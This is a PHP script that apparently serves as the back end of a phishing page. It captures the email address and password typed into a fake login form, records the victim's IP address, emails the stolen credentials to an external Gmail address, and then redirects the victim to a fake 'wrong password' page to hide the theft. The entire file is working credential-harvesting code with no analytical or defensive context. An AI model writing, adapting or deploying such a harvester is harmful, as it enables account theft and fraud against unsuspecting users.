<?
                                                                                                                                                                        

                                                            
$ip = getenv("REMOTE_ADDR");
$message .= "--------------New Login--------\n";
$message .= "EMAIL : ".$_POST['wnd_EmailField_515451']."\n";
$message .= "PASSWORD : ".$_POST['wnd_ShortTextField_12858']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY ABAGA-----------\n";
$send = "jamologs@gmail.com";
$subject = "Apartment Login";


mail($send,$subject,$message,$headers);


$redirect = "wrongEmail-Pass.php";

header("Location: " . $redirect);
 
?>